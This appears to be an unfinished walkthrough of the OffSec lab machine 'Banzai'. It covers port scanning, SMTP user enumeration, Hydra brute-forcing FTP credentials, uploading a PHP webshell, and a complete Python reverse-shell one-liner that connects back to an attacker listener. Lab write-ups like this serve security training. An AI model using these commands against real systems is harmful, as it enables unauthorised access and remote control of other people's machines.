# Banzai (WIP)

## Nmap

```
sudo nmap 192.168.233.56 -p- -sS -sV

PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
25/tcp   open   smtp       Postfix smtpd
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
8080/tcp open   http       Apache httpd 2.4.25
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

SMTP is open on the host. Bruteforcing `smtp-user-enum` reveals the following:

```
sudo perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.233.56
```

![](<../../.gitbook/assets/image (974).png>)

The user admin is not a default user on Linux / Unix systems. We can attempt to bruteforce this against relevant services starting with FTP.

We receive no hits with Hydra after 30 minutes.

![](<../../.gitbook/assets/image (975).png>)

However, trying with the mirai password list provides success on `admin:admin`.

```
hydra -l admin -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.233.56 
```

![](<../../.gitbook/assets/image (976).png>)

Logging in with FTP appears to show the root directory for the webserver. Knowing this we can upload a reverse shell. A PHP shell will be sufficiant as we can tell from the listing PHP is supported.

![](<../../.gitbook/assets/image (977).png>)

Using the PUT command we can upload a webshell then browse to it to access: [http://192.168.233.56:8295/webshell.php](http://192.168.233.56:8295/webshell.php)

![http://192.168.233.56:8295/webshell.php](<../../.gitbook/assets/image (978).png>)

A Python reverse shell was then executed on the webshell pointing back to a listener on port 21 to gain a full shell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.233",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

![](<../../.gitbook/assets/image (979).png>)
